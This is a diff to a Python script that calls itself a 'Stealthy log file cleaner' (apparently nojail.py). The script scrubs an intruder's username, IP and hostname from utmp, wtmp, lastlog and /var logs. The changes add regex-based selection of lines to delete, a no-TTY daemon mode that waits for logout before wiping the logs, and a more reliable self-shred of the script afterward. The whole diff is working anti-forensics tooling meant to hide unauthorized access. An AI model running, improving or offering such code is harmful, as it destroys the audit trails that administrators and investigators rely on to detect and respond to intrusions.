@@ -24,6 +24,7 @@ import os
 import platform
 import pwd
 import random
+import re
 import socket
 import struct
 import subprocess
@@ -355,13 +356,14 @@ def clean_lastlog(filename, username, ip, hostname):
 
 # -----------------------------------------------------------------------------
 
-def clean_generic_logs(files, ip, hostname):
+def clean_generic_logs(files, ip, hostname, regexp):
     """
     Generic log cleaning method which removes any line containing the given IP or hostname
     from files with a .log.([0-9]+)?(.gz)? extension in /var/.
     :param files: Additional files to clean.
     :param ip: The IP to scrub from the logs.
     :param hostname: The hostname to scrub from the logs.
+    :param regexp: An additional regular expression to select lines to delete.
     :return:
     """
     devnull = None
@@ -413,7 +415,7 @@ def clean_generic_logs(files, ip, hostname):
                 line = f.readline()
                 if not line:
                     break
-                if ip in line or hostname in line:
+                if ip in line or hostname in line or (regexp and re.search(regexp, line)):
                     if CHECK_MODE and not ask_confirmation("About to delete the following line from %s: %s." % (log, line.rstrip("\n"))):
                         g.write(line)  # The user wants to keep this line.
                     else:
@@ -449,6 +451,8 @@ def daemonize():
     the machine in order to catch SSH logout records (for instance).
     :return:
     """
+    sys.stdout.flush()  # Flush stdout so previous messages aren't printed multiple times
+
     def fork():
         try:
             pid = os.fork()
@@ -467,16 +471,19 @@ def daemonize():
     os.umask(0)
     fork()
 
-    print success("The script has daemonized successfully. Logs will be cleaned when this "
-                  "session ends.")
+    print success("The script has daemonized successfully.")
+    sys.stdout.flush()
 
     # Dirty trick to figure out when the user has disconnected from the current session:
-    # try to use the file descriptor for stdout and detect when it is closed.
+    # try to use the file descriptor for stdout and detect when it is closed. If it doesn't
+    # work because no TTY is present in the first place, just sleep for a minute so the user
+    # has time to log out.
     while True:
         time.sleep(10)
         try:
             os.ttyname(1)
         except:     # Exception caught: stdout doesn't exist anymore.
+            time.sleep(50)
             return  # This means the session has ended and we can proceed.
 
 # -----------------------------------------------------------------------------
@@ -507,6 +514,14 @@ def validate_args(args):
             print error("Could not determine the IP address. Please specify it with the -i option.")
             sys.exit(1)
 
+    # Compile the regular expression for efficiency reasons
+    if args.regexp:
+        try:
+            args.regexp = re.compile(args.regexp)
+        except:
+            print error("The regular expression specified is invalid.")
+            sys.exit(1)
+
     # Determine the hostname if needed.
     if args.hostname is None:
         try:
@@ -532,13 +547,13 @@ def validate_args(args):
                 print error("%s does not exist!" % log)
                 sys.exit(1)
             if not os.access(log, os.R_OK | os.W_OK):
-                print error("%s is either not readable or not writable!" % log)
+                print error("%s is not readable and/or not writable!" % log)
                 sys.exit(1)
 
     if args.daemonize:
         if not sys.stdin.isatty():
-            print error("Cannot detect session termination without a TTY! Please disable the --daemonize option.")
-            sys.exit(1)
+            print warning("Cannot detect session termination without a TTY! The script will automatically "
+                          "start in 60 seconds. Make sure you log out before then, or run the script again later.")
         daemonize()
 
 # -----------------------------------------------------------------------------
@@ -548,6 +563,7 @@ if __name__ == "__main__":
         parser = argparse.ArgumentParser(description="Stealthy log file cleaner.")
         parser.add_argument("--user", "-u", help="The username to remove from the connexion logs.")
         parser.add_argument("--ip", "-i", help="The IP address to remove from the logs.")
+        parser.add_argument("--regexp", "-r", help="A regular expression to select log lines to delete (optional)", default=None)
         parser.add_argument("--hostname", "-n", help="The hostname of the user to wipe. Defaults to the rDNS of the IP.")
         parser.add_argument("--verbose", "-v", help="Print debug messages.", action="store_true")
         parser.add_argument("--check", "-c", help="If present, the user will be asked to confirm each deletion from the "
@@ -568,6 +584,7 @@ if __name__ == "__main__":
                                                     "terminates. This script will then delete itself.", action="store_true")
         (args, positional) = parser.parse_args()
         args.log_files = positional
+
     validate_args(args)
     print info("Cleaning logs for %s (%s - %s)." % (args.user, args.ip, args.hostname))
 
@@ -585,8 +602,11 @@ if __name__ == "__main__":
     else:
         print error("UTMP/WTMP/lastlog cannot be cleaned on %s :(" % system)
 
-    clean_generic_logs(args.log_files, args.ip, args.hostname)
+    clean_generic_logs(args.log_files, args.ip, args.hostname, args.regexp)
 
     # If we daemonized to remove the logs after the user disconnects, also shred this script.
-    if args.daemonize:
+    if args.daemonize and os.path.exists(sys.argv[0]):
         secure_delete(sys.argv[0])
+    # When running the strips as "python nojail.py", the sys.argv[0] becomes "nojail.py"
+    elif args.daemonize and os.path.exists(os.path.join(".", sys.argv[0])):
+        secure_delete(os.path.join(".", sys.argv[0]))
